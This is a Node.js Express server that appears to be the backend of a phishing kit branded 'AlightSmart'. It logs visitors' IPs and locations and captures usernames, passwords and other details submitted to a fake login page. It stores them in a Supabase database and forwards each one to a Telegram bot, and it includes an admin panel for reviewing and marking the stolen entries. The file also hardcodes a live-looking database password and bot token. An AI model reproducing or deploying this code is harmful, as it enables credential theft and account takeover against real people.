const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Supabase Connection
const pool = new Pool({
    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
    ssl: { rejectUnauthorized: false }
});

pool.query(`
    CREATE TABLE IF NOT EXISTS records (
        id SERIAL PRIMARY KEY,
        type TEXT,
        username TEXT,
        password TEXT,
        address TEXT,
        ip TEXT,
        location TEXT,
        timestamp TEXT
    )
`).then(() => console.log("✅ Table Ready"))
  .catch(err => console.error("Table Error:", err.message));

function getRealIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
           req.headers['x-real-ip'] ||
           req.ip ||
           'Unknown';
}

// Telegram Config
const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
const CHAT_ID = "8559945003";

async function getLocation(ip) {
    if (!ip || ip === 'Unknown') return 'Unknown Location';
    const services = [
        `https://ipapi.co/${ip}/json/`,
        `https://freeipapi.com/api/json/${ip}`,
        `http://ip-api.com/json/${ip}`
    ];
    for (const url of services) {
        try {
            const res = await fetch(url, { timeout: 6000 });
            const data = await res.json();
            if (data.city || data.country_name) {
                return `${data.city || ''}, ${data.country_name || ''}`.trim() || 'Unknown Location';
            }
        } catch (e) {}
    }
    return 'Unknown Location';
}

async function sendTelegramNotification(record) {
    let usernameDisplay = record.username || 'Visitor';
    if (usernameDisplay.includes("Verification") || usernameDisplay.includes("Step")) {
        usernameDisplay = usernameDisplay;
    }

    const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +
        `• *Type:* ${record.type}\n` +
        `• *Username:* ${usernameDisplay}\n` +
        `• *Password:* ${record.password || '-'}\n` +
        `• *Details:* ${record.address || '-'}\n` +
        `• *IP:* ${record.ip}\n` +
        `• *Location:* ${record.location || 'Unknown Location'}\n` +
        `• *Time:* ${record.timestamp}\n\n` +
        `🕒 ${new Date().toLocaleString()}`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (err) {
        console.error("Telegram failed:", err.message);
    }
}

async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    const location = await getLocation(ip);

    try {
        await pool.query(
            "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
            [type, username, password, address, ip, location, timestamp]
        );

        console.log(`✅ SAVED: ${type} | Location: ${location}`);

        // Send notification for ALL activities (including page visits)
        await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });

    } catch (err) {
        console.error("Save Error:", err.message);
    }
}

// Routes
app.get('/', async (req, res) => {
    const ip = getRealIP(req);
    await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', async (req, res) => {
    const ip = getRealIP(req);
    await saveRecord('Page Visit', null, null, 'Login Page Opened', ip);
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', async (req, res) => {
    const { username, password, address } = req.body;
    const ip = getRealIP(req);
    await saveRecord('Login Attempt', username, password, address, ip);
    res.json({ success: true });
});

app.get('/api/records', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
        res.json(result.rows);
    } catch (err) {
        res.json([]);
    }
});

app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

app.post('/api/confirm-code', async (req, res) => {
    const { id, status } = req.body;
    try {
        await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/delete-record', async (req, res) => {
    const { id } = req.body;
    try {
        await pool.query("DELETE FROM records WHERE id = $1", [id]);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

app.post('/api/clear', async (req, res) => {
    await pool.query("DELETE FROM records");
    res.json({ message: 'All records cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

